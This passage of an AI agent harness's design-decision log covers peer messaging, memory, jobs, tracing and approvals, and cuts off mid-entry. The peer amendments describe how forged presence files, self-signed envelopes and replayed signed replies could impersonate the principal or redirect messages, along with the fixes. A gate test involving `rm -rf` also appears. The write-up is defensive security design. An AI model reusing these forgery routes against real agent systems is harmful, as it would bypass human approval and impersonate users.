  typed proposals, promotion, revert, nightly climb with held-out gate), scheduler, `ui` panels
  (docs/PANELS.md; subagents and scheduled jobs get no ui tool), and every D-021 carry-over.
- **Live acceptance (scripts/accept_wave3.py, OpenCode Go, 88 s, 6 main turns):** diff panel opened by the
  model; an edit verdict produced 3 proposals through the fast loop; an every-1m job ran and reported;
  `rm -rf` asked, deny kept the folder, the gate decision is in the signed ledger and verifies; Jev answered
  3 of 4 gate calls; usage names the route that served.
- **Linux audit:** the Linux builder's fixes merged (#9 to #12, #14 to #16); Hermes is now opt-in in install.sh.
- **Open:** the canary day (A, seat `canary`, launcher `exo-canary`, a copy of the principal store so the
  real one is untouched); TUI footprint on the Linux test machine (#17, D-022 escape hatch); nightly learning trigger;
  brief "learned" section; climb candidates beyond add and drop.

## D-024 (2026-10-12) Lean acceptance: continual feedback, not a day-long gate
- **A's words:** "day done? im a lean methodology user, thats not how we operate. i will give you continual
  feedback and pointers as i use it."
- **Decision:** wave 3 has no "full day in the TUI" exit test. A uses the canary seat (agent exo-razi) every
  day and sends notes as he goes; each note is a small cycle (fix and ship, or log a design item). A
  separate session handles that feedback (`~/Work/handoffs/exo-canary-feedback.md`); product design and
  feature building continue in the main session. Promotion of lessons still needs held-out wins (D-022).

## D-025 (2026-10-12) Harness self-observation: trace, findings, re-verification
- **Why:** A asked the first agent (exo-razi) to evaluate its environment. It missed the biggest problems
  because it could not see how the harness performed: an 8 min 20 s first turn with no event saying why, no record of
  which route served a call or of fallbacks, a shown model that disagreed with the served one, a test suite
  run twice by a subagent, two tool errors, and `cost_usd` always null. A wants a recursively improving
  feedback loop built into the harness.
- **Decision:** one loop, record, read, report, verify (docs/TRACE.md). Two new events, `model.call` and
  `harness.error` (24 of 30), a `timing` summary on `turn.completed`, `is_error` on `tool.completed`.
  `exo.core.trace` reads a session into per-turn rows (old sessions are derived from timestamps) and applies
  eight anomaly rules with stable signatures and thresholds in config (`trace` table). Findings live in a
  `findings` table in sessions.sqlite, not a jsonl file: a dedup is one transaction, the server and the CLI both
  write, and a copy of the database carries the findings with their sessions. A finding marked fixed in a commit
  is re-measured: a recurrence on a harness at or after that commit reopens it, and quiet for 20 turns or 3 days
  verifies it.
- **Agent surface:** `exo_trace` and `exo_harness_report` (main agent only; subagents are covered by the rules).
  `/trace` and `/findings` are built-in commands over `command.run`, so no new protocol command was needed.
  The TUI shows the serving route and an open-findings count.
- **Not done:** pricing (`cost_usd` stays null for models missing from the catalog) is a separate fix; a
  provider time to first token is measured at the loop, not inside each provider.

## D-026 (2026-10-12) Peers and one ingress path
- **Amendment 2026-10-28 (#638):** peer presence must be a JSON object with an integer pid; boolean,
  floating-point and string pids are invalid. Invalid records are skipped and normal discovery prunes
  them without blocking other peers. Unknown signed fields remain in the original verification document.
- **Why:** A watched two Claude Code sessions avoid a file collision by messaging each other and asked for it in
  Exo, and for Hermes agents too (docs/PEERS.md).
- **Decision:** anything outside the principal's keyboard goes through one path, `Ingress(source, sender, trust,
  body)` -> exo-gate policy (auto, hold, deny) -> deliver (steer, queue, wake) -> receipt, event, trace. Peers are
  the first source; the bus channel, scheduler and MCP Events plug in later (D-027) with only their transport.
  Policy is the receiving seat's: auto for the same principal, hold otherwise, deny for a bad signature; held
  messages wait 30 minutes for an approval card. A peer message is input, never consent: attempts to approve
  are refused and shown to the principal.
  *Amendment 2026-10-18 (PR #212):* a held message whose sender named no session, while no session is live, has an
  approval with no thread. Both clients show that card in every thread. Allow used to close it as denied ("no
  session here can take a message"), although the card says allow delivers it. Allow now opens a new thread of the
  seat, titled after the sender, and delivers the message there. If that thread cannot open, the message closes as
  not delivered and the principal gets a notice. Deny and expiry open no thread.
  *Amendment 2026-10-23 (#132, pinned peer keys):* "auto for the same principal" read the sender's key and principal
  from its presence file, which any same-user process can write. A forged one plus a self-signed envelope arrived as
  the principal typing in another client. The receiver now checks a peer only against keys in its own home: its own
  key for its own seat name, and for a seat of this home (a seat file here, or its key file in `keys/`) the
  registry's entry for the name, else the `.pub` beside the seat's key file in `keys/`. A peer pin
  (`exo keys pin --peer`, a `peers` map apart from the D-040 signers) also checks a seat. So does a registry entry or
  `.pub` for a name that is no seat of this home, such as a plain `exo keys pin` of another home's seat, which counts
  as a peer pin. A registry entry decides for its name, so a key rotated out with `--replace` stays out. A seat
  checked against a key of this home takes its principal from its seat file here. A key with no seat file, or one
  whose seat file names no principal (an unseated daemon, a Hermes profile on this home), counts as the principal
  `config.json` names, read from the file when the receiver starts. It reaches a daemon as that principal only when
  the daemon runs as that principal or as none and has no seat file naming one. A seat whose seat file names its
  principal holds such a key as `other`, since `config.json` is not a store file and a tool call may change it without
  asking (until D-074, #125; a program outside the gate still may). Giving the key a seat file that names its
  principal delivers it at once. The principal a presence file
  names never raises trust but can lower it: when it is not the one this home records for the sender (none stands
  for `config.json`'s), the message is `other`, as before #132. So a daemon or Hermes profile run as another
  principal is held even by a daemon with no seat principal, and so is a daemon under the receiver's own seat name
  (two unseated daemons are both `exo` and share its key). A seat checked against a peer
  pin is `other`: this home has no record of whose it is. A sender with no key here is held as `other`, and its
  card says `key not pinned`. A rule may hold or deny it, but never deliver it sooner than its policy, since a
  presence file can claim any name. A name that holds a key here is checked against those keys alone, so another
  key is denied. That includes a seat of another home with the receiver's own name (two unseated
  homes are both `exo`): its key can be pinned as a peer, and it is then held as `other`. To pin a peer of another
  home, read `<that home>/keys/<seat>.pub` and run `exo keys pin --peer <seat> <key>` here. A `from` that is not a
  seat id is denied before any key lookup, and the sender is told `the sender is not a seat name`. A presence file
  or `.pub` is read only when the open file is a plain file, and a presence file only in the peers folder, so the
  `daemon` an envelope names cannot be a path or a FIFO. A later receipt must name the seat the message went
  to, come from that seat's daemon and verify against that seat's keys here, never a presence key. Stricter than
  before for some honest setups, each with a fix in `docs/PEERS.md` "Peer keys": a key made again while the registry
  pins the old one (`exo keys pin --replace`), a seat file naming a key outside `keys/` (pin it), a profile name that
  is not a seat id, and a key with no principal of its own toward a seat that names one (a seat file). Not changed:
  under D-039 any same-uid socket client can ask a daemon to `peers send`, which arrives as `same-principal`
  automation, by design. A process outside the gate can still read seat keys or write `keys/`. A tool call may
  change `config.json`, which after a restart can change the principal a key with no seat file counts as toward a
  daemon with no seat principal. Rejected: holding
  a same-name seat with a different key as `other` without a pin, which would let any presence file under a pinned
  name reach the card. Rejected: giving a key with no seat file the receiver's `EXO_PRINCIPAL`, which a seated exod
  sets to its own seat's principal, so every such key reached that seat as its principal (#525 review).
  *Amendment 2026-10-26 (#523, forged presence cannot take a send or answer for its name):* the #132 amendment left
  the named gap above: a forged presence file under a name whose key this home pins named the attacker's own socket
  and `send` shipped the text there, and its unsigned first receipt was published to the sending model (later
  receipts were checked already). Both halves close with the same primitives. A daemon's presence entry now signs
  itself: the entry carries its seat key's signature over the whole entry but the signature. Before the text
  ships, `send` re-reads the file the row came from and requires the entry to hold a key pinned for that seat here
  and to carry that key's signature, and the socket shipped to is the socket inside the entry that verified: a
  file with a socket of its own, with the pinned key's public half copied into it beside that socket, or with no
  signature, is refused and nothing is sent, and the socket the scan saw is not shipped to once the file no longer
  verifies. The receiver signs the first answer to a `deliver` with its seat key (`msg_id`, `state`, `detail`,
  `mode`, `session`, `by`, `daemon`, `ts`, the same doc shape a later receipt uses), and the sender verifies it
  against the keys pinned here for the seat the message went to, as `receipt` does since #132; a reply that does
  not verify is not published and the send fails. A name this home holds no key for is unchanged: no ship check,
  no reply check, the receive side's trust ladder decides what arrived, and such a peer is still held as `other`.
  A bus seat keeps the old shape on purpose: the bus routes by seat through the relay the send already posts to,
  never through a socket a presence file names, so a forged file cannot redirect a bus send, and the bus ack
  carries no outcome of the peer's own (its `delivered` names the relay's seq), so there is no first receipt to
  verify. Stricter than before for two honest setups: a daemon whose presence file or first receipt is unsigned, as
  an older `exo`'s are, cannot be sent to while a key is pinned for its seat; update it, or leave its seat
  unpinned, and the trust ladder applies. And a seat whose key was made again cannot be sent to until this home
  pins the new key (`exo keys pin --replace`, USER-GUIDE §7). Rejected: requiring a pinned key for every name,
  which breaks messaging an unpinned peer of another home until `exo keys pin --peer`, a step the receive side
  does not ask for either.
  *Amendment 2026-10-26 (#603 review, a signed first reply is not a receipt):* the #523 amendment signed the first
  reply in "the same doc shape a later receipt uses", and `deliver` signs it for any envelope, one that does not
  verify too, with the `msg_id` the envelope names. A client of beta's socket read a held message's id from beta's
  `list`, sent beta a junk envelope with that id, and handed the signed `denied` to alpha's `receipt`, which
  published `denied` for a message still held at beta. That broke the #132 rule that a later receipt comes only
  from the seat the message went to. The two docs now sign their kind: `deliver`'s reply carries `kind: "reply"`
  and `notify_sender`'s receipt `kind: "receipt"` (Hermes' peers module calls the same two, so it follows).
  `receipt` takes a doc whose kind is `receipt`, or one with no kind as an older `exo` signs its receipts, unless
  that kind-less doc carries `mode` or `session`: a #523 first reply signs those fields and no receipt ever has, so
  a #523 build's reply cannot pass as a receipt either. The send path takes a reply by the same rule (`doc_kind`):
  `kind: "reply"`, or a kind-less doc that signs `mode` or `session`, so a receipt, an older `exo`'s included, is
  no first reply, and a send to a #523 build still completes. Refusing that kind-less reply would gain nothing and
  cost a duplicate: the reply is checked after the text has gone, so a send that fails on its reply has already
  reached the peer, and only the outcome is refused (USER-GUIDE §7 says so). A reply is
  still signed for an envelope that does not verify: signing it only for a verified envelope would leave an honest
  sender whose key the receiver does not hold, or holds an old copy of, with an unsigned `denied` it must refuse,
  so it would learn nothing of why. Two review nits ride along: the presence signature is checked over the entry's
  JSON as written, so a newer `exo` that signs a field this one does not know still verifies, and a first reply
  that is not a mapping fails the send as a refused reply.
  *Amendment 2026-10-29 (exo-desktop #52, a named session must take messages):* the path took the session a sender
  named as given. A peer's `to_session`, or the session the bus channel passed, reached a finished (locked) child,
  a running subagent, or an id that does not exist. The message was queued or held there, or it started a turn.
  A peer listing never offers those sessions, and a message with no session never lands in one (D-070). Now the
  path asks its target first, before the policy. The engine's target takes a named session that exists, is not a
  subagent and is not locked. A scheduled run can still be named by its id, as before. Any other name gets a
  denied receipt that names the session, and nothing is held for the principal. A held message whose session
  finished before the principal allowed it is denied on release, and opens no new thread: that thread is only for
  a message that named no session (PR #212). A job notice is the harness's own and still reaches its job's
  session, a subagent's too. Hermes' peers target picks a named session only when it knows it, so it follows.
  A message that tries to approve something is still refused first. The warning to the principal went to the named
  session even when that session takes no message, so no client showed it. It now goes where a message with no
  session would go.
- **Protocol:** one command `peers` with actions list, send, deliver and receipt (the brief said
  `peers.list` and `peers.send`, but a second command would break the cap; this uses the last slot, 30 of 30, so
  the test now allows 30). Events `peer.message` and `peer.delivery` (26 of 30).
- **Hermes:** the exo-bus plugin gets a peers module. Mid-turn delivery uses `agent.steer`, not
  `ctx.inject_message`, because in the CLI inject lands on the interrupt queue and interrupts. The bus is not
  registered as a Hermes platform: that is a gateway adapter admitting bus text as user input, so it needs its own
  review.
- **Not done:** web client view, receipts for bus sends, held messages across restarts, live gateway test.

## D-028 (2026-10-12) One agent, one continuous memory
- *Amendment 2026-10-28 (#450):* fork copies retain a derived indexed original position. Context lookups no longer parse each copy JSON; the one-time backfill leaves signed data and log hashes untouched.
- **Why (A, verbatim):** "well if the harness is built according to my vision for the implemenation of the optchat
  memory system all sessions should technically be the same agent with continuous memory". Exo had taken the turn
  model (D-013) but kept sessions: a summary tree per session, `/new` as a blank mind, exo-memory's daily log as a
  second log reached through recall. Two windows of one seat were two minds.
- **Decision:** docs/MEMORY-MODEL.md. A seat is one agent with one append-only log (in sessions.sqlite, a position
  and hash chain per entry, `exo memory verify`) and one summary tree. Windows, channels, scheduled runs and peer
  messages are threads of it. A call is the agent's tree in a byte-stable system message, the thread's own tail,
  and stored notes of what other threads did since this thread last looked. `/new` is a new thread (same memory),
  `/new private` is logged but never shared, `/sessions` lists threads. One process writes an agent
  (`run/agent-<id>.lock`); windows without exod join the first window's core and take over if it closes.
  Subagents keep their own logs (`memory_zoom(subagent=...)`); their report reaches the parent as the delegate
  result. exo-memory reads the core log instead of writing its own. Existing sessions were imported once, in time
  order, with `origin=import`; nothing deleted.
  *Amendment 2026-10-18 (several seats in one home):* seats whose files sit in one `$EXO_HOME` are separate agents.
  Each runs its own core with its own writer lock, and all of them share `sessions.sqlite` and `schedule.sqlite`.
  The database numbers each event past the table's highest, so two cores never reuse a `seq`. `hello` reports that
  highest number, so a joining client skips the other seat's past events. Only an agent's writer fails that agent's
  leftover delegate tasks. A scheduled job with a `seat` runs only in that seat's core. A job with no seat runs once
  per slot, in the seat whose timer claims the slot first. `add` refuses a seat that no core could run
  (docs/SEATS.md "Several seats in one home", docs/SCHEDULE.md).
- **Protocol:** still 30 commands: `session.create` takes `kind`, `SessionInfo` carries `agent` and `kind`. One
  event, `memory.summarized` (27 of 30): tree upkeep was showing as `context.compacted`, which read as context
  compaction in the trace and TUI.
- **Calls made by the lead:** messages stay stored per thread with an agent position on top, so undo, fork, tool
  repair and every session-keyed event keep working; undo hides log entries rather than deleting them. Recall moved
  out of the system message to just before the turn. Small spans (the 0bb212e floor) stay out of the system
  message and count toward the view budget, so they merge instead of piling up. Providers that key their cache on a
  conversation id get one id per agent. A steer that lands during or after the final reply now gets its own model
  call in the same turn. Peers between threads of one agent were left in place (harmless), not removed.
- **Live check (temp copy of ~/.exo, glm-5.3-flash, 25 turns):** a fact told in window A was answered in a new
  window B on its first turn with no recall call; two windows ran at once and each saw the other's fact at its next
  call; after `/new` the earlier facts were answered; after a restart the agent continued and the imported canary
  thread was listed; the log verified (104 entries). Cache: the 20-turn run read 18.8% from cache against 58.7% in
  the old canary trace (kimi-k3), traced to a per-thread provider session id splitting the cache, plus the import
  backlog changing the prefix. Fixed after the run; the fixed code was not re-measured live at 20 turns (turn
  budget). Offline, on the same 20-turn script with an ideal prefix cache, prefix reuse is 84% against 93% before
  (77% against 79% with recall).
- **Not done:** a live 20-turn cache measurement on the fixed code; importing exo-memory's old episodic log (it
  holds copies of the same sessions); summaries for imports are slow on glm-5.3-flash (about 75 s per leaf).
  *Amendment 2026-10-18 (PR #213):* the system message now names the thread's working folder, after the memory
  block and before the tree. The claude CLI runs in a private folder and names that folder in its own environment
  note, so the agent said it worked there. The new line names the session's stored cwd and overrides any folder a
  note names. Subagents get the same line in place of their own "Working directory" line. The line is fixed per
  thread, so each thread's prefix still caches. The cost: the byte-stable prefix is now shared only by threads in
  the same folder. Anthropic routes put one cache breakpoint at the end of the system message, so an agent with
  threads in two folders caches its tree once per folder.
  *Amendment 2026-10-18 (PR #216):* a private thread wrote to the ledger and lost its own start. Now nothing in or
  under a private thread is remembered: `SessionStore.private` walks up the parents, the loop skips the memory
  writes, memory tools get `agent_context="private"`, and learning, findings, panel responses and the context
  plugin record nothing from it. Its entries still stay out of the agent tree, so it keeps a summary tree of its
  own (key: its session id). Its tail starts at that tree's last summary, and its turn waits for that tree as D-068
  says. Its delegate children open with `memory_zoom(subagent=)` only from it or a fork of it. A fork's copies count
  at their original's log position, so a fork opens with its parent's tail. Details in docs/MEMORY-MODEL.md
  "Private threads".
  *Amendment 2026-10-21 (#245, PR #405):* a copy counts at its original's log position only while the tree holds
  that original. When the parent undid an entry after the fork, the tree dropped the original, and no tree held
  the copy. Once the fork's own later entries were summarized, its tail started after the copy, so its calls lost
  it. Now a fork that is not private keeps such copies in its tail, verbatim, in order, ahead of its own entries
  (`SessionStore.orphaned_copies`). Only copies of logged entries are kept. A copied context note was never logged,
  so it still leaves the tail as the tail moves on. This is the second option in #245. The first, a summary tree
  per fork as a private thread has, was not taken: every public fork would run a second tree, with its own
  summarizer calls and a turn that waits on it (D-068), for copies that exist only after an undo in the parent.
  The cost of the second option: the kept copies sit outside `tail_messages` and `/compact`, so a fork whose
  parent undid 20 turns carries all 20 in every call. In a fork of a fork the kept copies come after the middle
  fork's own entries, which the tree holds. The lookup runs only on a fork (`fork_seq` set) and reads only its
  copies, so a thread that is not a fork pays nothing.

## D-029 (2026-10-12) jevgrep as code_find; native port later if the measured win holds
- **Why:** "where is X decided" questions cost an agent many grep and read rounds. dzhng/jevgrep (MIT, `jg`
  0.8.0) asks the Jev decision model, which Exo already uses, to pick files and verbatim excerpts.
- **Decision:** a low-risk `code_find(question, path)` tool that shells out to `jg` (installed, else
  `npx -y @dzhng/jevgrep@0.8.0`). Backends: TypeSafe Jev with Exo's jev key, then local Laya through jg's custom
  endpoint. Hidden when Node 22+ or the package is missing, with the reason in `exo models`. Available to the main
  agent and subagents. An Exo skill adapted from theirs, with credit. Docs in docs/TOOLS.md.
- **Key:** `jg` ignores key environment variables and reads only a saved config, so each call writes a throwaway
  config in a 0700 temp dir, feeds the key to `jg auth --stdin`, searches, and deletes it. The key is never in argv,
  the child environment, a log or a result.
- **Measured (2026-10-12, Exo repo, 4 questions):** the right files each time, 9 to 19 s per call. Against a
  glm-5.3-flash subagent with only grep and read_file, code_find used fewer tokens (about 4.5k against 8k input)
  and fewer tool calls, but took longer in wall time and was not more correct on this small, well-named repo; the
  model also miscounted line numbers inside excerpts. Two questions is a weak sample.
- **Next:** a native port (Python, Exo's own decision route, no Node) only if more measurement shows a win on
  larger or less tidy repos. **Not done:** per-call spend accounting, a jg result cache owned by Exo.

## D-030 (2026-10-12) Onboarding: an agent-led /intro, and a tutorial mode of client-side tips
- **Why (A, verbatim):** "want to add a tutorial mode that users can toggle, like the one many games have ... so
  that when users are new to the software it guides them through things and gives little hints/explanations
  about everything. i also think there should be a slash command like slash intro or something where the exo
  agent gives the user an orientation of what the harness is, what features it has, how to use it, etc. because
  theres a lot of new unique and unfamiliar aspects. for example many users will be used to having to manage
  compaction manually or be aware of context limits. the slash intro orientation should also just automatically
  trigger when a user runs the exo harness for the first time".
- **Decision:** TUI, one skill and config only; the protocol stays at 30 commands.
  - `/intro` sends a normal user turn (shown as "/intro"). The agent loads the `exo-intro` skill and gives a short,
    staged, interactive orientation, tailored to what the user is used to, ending with `/tutorial`. The facts live
    in `skills/exo-intro/SKILL.md`; a test requires every slash command in `/help` (TUI table and core commands)
    to appear in it.
  - First run: `$EXO_HOME/state/onboarding.json` has no `onboarded` value, so `exo-tui` runs `/intro` and turns
    tutorial mode on. The marker is written when the intro turn starts (the `turn.started` event), not when it is
    sent. Skips: `--no-intro` (also records the home as onboarded), `EXO_NO_INTRO=1` (no write), `--resume` and
    `--session`. Only the `exo-tui` entry point asks for it (`ExoApp(auto_intro=True)`), so tests, `exo serve`
    and headless runs never trigger it.
  - Tutorial mode: `/tutorial on|off|reset`, saved as `tutorial.enabled` in config.json. Tips are in
    `clients/tui/exo_tui/hints.toml`, drawn by the client as dim "tip:" lines: no model tokens, not in the
    transcript the model sees, each once (seen list in onboarding.json), at most one per turn. 11 moments: first
    message, first memory summary, first approval, first steer, first Esc, first fallback or route change, first
    peer message, first `/new`, first finding, first slow turn (60 s, approval waits excluded), first `code_find`.
  - While on, the core appends one line to the stable system text (`TUTORIAL_LINE`, last, after the memory block
    and before the summary tree). Off, the text is byte-identical to before (tested); a toggle costs one cache miss.
- **Calls made by the lead and by me:** content in a skill, not a canned screen, so the user can ask questions and
  the text is reviewable; tips client side so they are free and cannot pollute memory; a tip that loses its turn
  to another is not used up; the line sits after the memory block rather than after the tree because the tree
  view is built by the context engine, and changing that would touch every caller for a once-per-toggle miss.
  `--no-intro` writes the marker so an existing user is asked to skip once, not forever.
- **Rejected:** a new protocol command for onboarding state (cap is full); model-written tips (cost, and they
  would enter memory); tracking seen tips in the core (a second client would then show them again for no reason).
- **Not done:** the web client has no tips; upgraders without the marker see the intro once (pass `--no-intro`).

## D-031 (2026-10-12) UI/UX overhaul, terminal half: make the TUI look like the site's terminal figure
- **Implementation amendment (2026-10-29):** the principal requested persistent desktop workspace choices. The shared web client accepts validated native display preferences and forwards only view, thread ID, layout, appearance, pet mode and scroll fraction. Explicit navigation wins; an exact session 404 leaves the chooser open and clears the saved pointer; bounded list omission never proves deletion. The native host owns scoped persistence. No prompts, drafts, transcript contents or credentials cross the preference bridge. See `docs/ui/WEB.md`, "Native display preferences".

- **Web amendment, 2026-10-28:** at the principal's request, the shared web workspace keeps the angular
  identity while using readable sans serif conversation text, restrained surfaces and explicit attention
  states. Dark remains the default; Light and System are saved presentation choices. Persistent navigation
  supports browser history and keyboard access. Loaded-conversation search, status filters and Show latest
  messages use existing records and preserve drafts. The web boot overlay is removed. This changes no
  model, permission, storage or execution policy; desktop consumes the shared implementation under D-089.
  Current behavior is documented in `docs/ui/WEB.md` and `docs/USER-GUIDE.md`.
- **Why (A, verbatim):** "UI/UX needs an overhaul. the project website at exo.askaconsult.com gives such a
  futuristic feeling - our ui/ux should be deliver on it".
- **Decision:** the language already exists on the site (`figure.term`, `style.css`), so the TUI takes it
  as is instead of inventing one. Presentation only: no protocol or core change, 30 commands, same keys.
  - A Textual theme from the site tokens (`exo_tui/theme.py`), with a test that fails if it drifts from `style.css`.
  - Instruments: brand bar with a live dot, a status strip (served model and the fallback it took, memory gauge,
    cache share, cost, findings), a wire with a travelling packet for data in flight.
  - Restyled transcript, one-line tools with elapsed time, approval, taste, finding, peer and `/context` panels
    with key chips, `memory.summarized` as a one-line cold event, tips, an empty-start card, a short skippable
    boot sequence, a block caret and a visible steer state.
  - `EXO_REDUCED_MOTION=1` turns motion off, `NO_COLOR` paints nothing. Details and screenshots: `docs/UI.md`.
- **Calls made:** the boot sequence is opt-in (`boot_anim`, set only by the entry point) so tests and headless
  runs never see it; "memory verified" is not claimed because the core sends no verification result, the line
  says `ready`; the served route stays in the strip after `usage.updated` (which carries the requested route);
  diff `+` and `-` keep the terminal's own green and red; the web client is a separate change.
- **Not done:** a `[?] explain` key on approvals (it would be new behaviour); a visual check of `NO_COLOR` in a
  real terminal (the SVG export cannot show the terminal's default colours).

## D-032 (2026-10-12) What exo-razi asked for: background jobs and principal capture (Part A); tools, trace and commands (Part B)
- **Foreground shell result amendment (2026-10-28, #791):** actual nonzero exit codes, timeout and interruption set
  `ToolResult.is_error`; captured output and `[exit N]` remain unchanged. Code-zero pipelines with a masked-stage
  note remain successful. Failed write-shaped commands do not reset repeat detection as successful file progress.
  No automatic retry, stop, permission or model policy changes. Background launch receipts are unchanged.
- **Why (A asked exo-razi, the canary Exo agent, what it would want; the brief is ~/Work/handoffs/exo-razi-asks-brief.md):**
  of seven asks, the two that hurt most in real use were a shell that holds the turn (a build or a long test run) and
  the principal's words reaching memory by discipline instead of by mechanism.
- **Item 1, background shell jobs (docs/JOBS.md).** `bash(background: true)` returns a job id at once; output goes to
  `$EXO_HOME/run/jobs/<id>.log` (capped, one rotation); `jobs`, `job_output(id, tail, grep)` and `job_kill(id)`. A job
  belongs to the agent, not the turn: Esc stops the turn, never the job. On exit the owning thread gets a completion
  notice through the ingress path peers use (`core/ingress.py`, a `job` source): steered into a running turn, else
  queued for the next one; a turn starts only if the seat allows (`[jobs] wake`, same rule as peers: off while a client
  is attached). Limits: 4 concurrent per agent, 2 h wall, 5 MB output. Jobs end with exod; after a crash the next
  start reports them `lost` (the process is not touched: a pid can be reused). The gate classifies the command exactly
  as foreground bash (a test compares classifications and decisions).
  *Amendment 2026-10-20 (PR #346, a follow-up to PR #321):* a thread of its own builds each completion notice. Since
  #321 the notice reads and redacts the job's whole log, and on the event loop that took hundreds of milliseconds for
  a 5 MB log. The thread belongs to the job manager, not to the loop's default pool, so a busy tool thread never holds
  a notice up. Notices are built one at a time and handed on in the order the jobs ended. Shutting down waits for a
  notice still being built and, when no turn runs, keeps it for the next turn. A shutdown that runs to its end waits for
  the last build and then stops the thread, so no worker outlives the engine. A hard stop that cancels that wait loses
  the notice being built, but the job's end still goes out as a `job.updated` event. `close()` then shuts the thread
  down without waiting, so it takes no more work. That build runs on to its end, and the process waits for it as it
  exits. The notices of jobs lost in a restart are built the same way, in tasks the core's start does not wait for, so
  two first commands at once still start the runtime once. A turn still running when such a notice is built takes it at
  its next tool round, as it takes a completion notice. Before, a lost job's notice was queued before any turn could
  start. A lost job's notice that fails is reported as a `harness.error` event, as a completion notice that fails is. So
  is a notice that fails while exod shuts down: `close()` keeps the engine's trace sink until its steps end and drops it
  just before the session store closes. Before, it dropped the sink first. Rejected: the loop's default pool
  (`asyncio.to_thread`), where busy tool threads held the notice up and `close()` with it. `docs/JOBS.md` "The
  completion notice".
- **Item 4, principal capture as a mechanism (docs/MEMORY-MODEL.md).** (a) The summary template has a verbatim
  `Principal Directives` section, and a harness check restores any ruling or correction the model dropped; (b) before
  a leaf with principal messages is summarized, the span is offered to the memory provider's `capture_principal`
  (exo-memory: the signed ledger) and the leaf records that they were captured; (c) `/context` shows the uncaptured
  count and `/compact` captures first.
- **Protocol:** commands stay 30. One new event, `job.updated` (28 of 29), with a `state`, not the two the brief named
  (`job.started`, `job.completed`): the cap is tight and `task.updated` is the precedent. The start is state `running`;
  the end state, exit code and how the notice was delivered are in the second event. `/context` and `/compact` stay
  `command.run` built-ins; capture adds no event.
- **Calls made by the builder:** reuse of `EngineTarget` through a `JobTarget` subclass rather than a second delivery
  path; the notice skips the ingress consent regex because the harness wrote it (the body is framed as data); a job
  killed by `job_kill` sends no notice; subagents cannot start jobs; lost jobs are not killed on restart; capture marks
  positions in a new `captures` table because the log's hash chain must not change, and the `summaries` table gained
  `principal` and `captured` columns; imports, scheduled prompts, peer messages, job notices and bare acks are not
  "principal messages"; a hook that fails leaves messages uncaptured and does not stop summarizing; the capture hook
  runs after `on_pre_compress` so the ledger gets correction targets from the full span before the strict pass.
- **Not done (Part A):** the web client has no job view; Hermes has no job tools; `capture_principal` exists only in
  exo-memory (a seat without a principal store shows its uncaptured count as never captured, which is true).
- **Part B (items 2, 3, 5, 6, 7).** No new protocol command (the cap of 30 stays).
- **2. `exo_get(id, body_only)` in exo-memory, not an `expand` flag on `exo_recall`.** Recall prints
  `summary only; exo get <id>`; the agent now has the tool that line names. A separate tool because recall is a
  search under a token budget and `expand` would turn it into two verbs with two result shapes; a read by id needs
  no query and no budget; the name matches `exo get` so what the agent reads in recall is what it types. Same
  store and same access as recall (the seat's principal store, nothing else); a missing id returns near matches
  and rereads the store once; output cut at 40k characters.
- **3. `/handoff [path]`, agent-led like `/intro`.** The core answers `command.run` name `handoff_facts` (an
  unlisted built-in, so no protocol command): thread, git state of the cwd, open findings, running tasks,
  the latest tree summaries (the decisions), the last three trace rows, the default path, and one key per entry of
  `CoreEngine.handoff_sources`. `jobs` is the pre-seeded hook (empty list): Part A registers
  `eng.handoff_sources["jobs"] = fn(session)` and `/handoff` lists open background jobs with no other change; a
  source that raises is reported and skipped. The TUI sends one user turn (shown as "/handoff") with the facts and
  the path; the agent loads the `exo-handoff` skill (template: goal, state, done, decisions, next, blockers, open
  jobs and tasks, paths) and writes the file with its normal write tool, so the gate sees it. Default path
  `~/Work/handoffs/<seat>-<date>.md`; a folder argument gets that file name inside it.
  The client needs only a row in its command table and `exo_tui/handoff.py`.
- **5. Trace thresholds measure the harness.** `turn.slow` now fires on wall time minus tool time and approval
  waits (model plus overhead), 60 s by default, bug at 5 times; a new `turn.wall` (papercut) caps total wall at
  30 min (`turn_total_wall_s`). A seat's `[trace]` table overrides config.json key by key (engine and
  `exo trace` both read it). Old sessions without a timing summary subtract the recorded tool durations. Existing
  `turn.slow` findings keep their signature, so they count and verify as before.
  *Amendment 2026-10-12:* with slow routes a 6-call turn spends 150 s or more in the model, so a rule that counted
  model time fired on normal turns. `turn.slow` now means harness overhead only (wall minus tool, approval and
  model-call time), 30 s by default (`turn_wall_s`, same key and seat override). Slow providers get their own
  rule, `model.slow:<route>`, per call and per route, 60 s by default (`model_call_s`, with `model_call_routes`
  for a per-route limit). The TUI long-turn tip uses the same line. Existing `turn.slow` findings keep their
  signature.
- **6. Cost in the trace.** Per call and per turn (subagents included), in `exo trace`, `/trace` and `exo_trace`
  (`--calls`, `calls`). The figure is the usage the router priced from the catalog entry of the serving route,
  or the provider's own. `unknown` when unpriced, never `$0`; a mixed turn shows `$x+`. Two fixes it needed: the
  router charged cached tokens twice for OpenAI-style providers (their `prompt_tokens` includes the cached part),
  and config could not set a price at all, so `models.models."provider:model"` now overrides the catalog. The
  catalog has no price for the subscription routes (opencode-go); they read `unknown` until a price is set.
- **7. Cwd guard and default cwd.** One warning line (a `notice`, user only, not in the model's context) when a
  thread starts in a folder that is not inside a git repo, and again, once per folder per thread, when a shell
  call works in one (its `cwd` argument or a leading `cd X &&`). A seat sets `[session] cwd`; it beats
  config.json's `cwd`, and a missing folder is ignored and said so. A persistent `cd` does not exist (each shell
  call is its own process), so the guard watches the folder a call runs in.
- **Rejected:** `expand` on recall; a protocol command for handoff; writing the handoff file from the core
  (it would bypass the gate); appending the cwd notice to bash results (changes tool output for every test and
  every model).
- **Not done:** prices for subscription routes; cost in the TUI status line; a git check that runs `git`
  (the guard walks up looking for `.git`, so a bare or broken repo counts as a repo).

## D-033 (2026-10-12) Approvals bound to the exact text, who may approve, and an outbound scrub
- **Why:** orda's review (P0-4, P0-5). An "always" answer covered any later text under the same rule, was lost
  on restart, and any local client could answer any approval. A public repo once shipped with task ids, profile
  names, model strings and a home path in it (lrn-042); the gate's posting checks were empty by default.
- **Binding:** for an outward act (post, message, email, social, payment, account, or anything public or
  irreversible) the gate hashes the exact text, title, target, tool and arguments. The hash is the approval's
  `binding`; an edit gives a new hash and a new ask. A client may echo the binding in `approval.respond`; a
  mismatch is refused as `stale`. Binding to the full arguments, not only text and target, means nothing else
  can change under an approval either.
- **Who may approve:** `policies/approvals.yaml` maps category to `principal`, `seat:<name>` or `role:<name>`.
  Default is principal only, so single-user installs behave as before. The principal can always answer: their
  consent is the root. Peers still cannot (D-026). The list rides on `approval.requested` as `approvers`; the
  engine refuses other answerers as `forbidden`. A seat answers as `seat:<name>` and must sign the answer with its
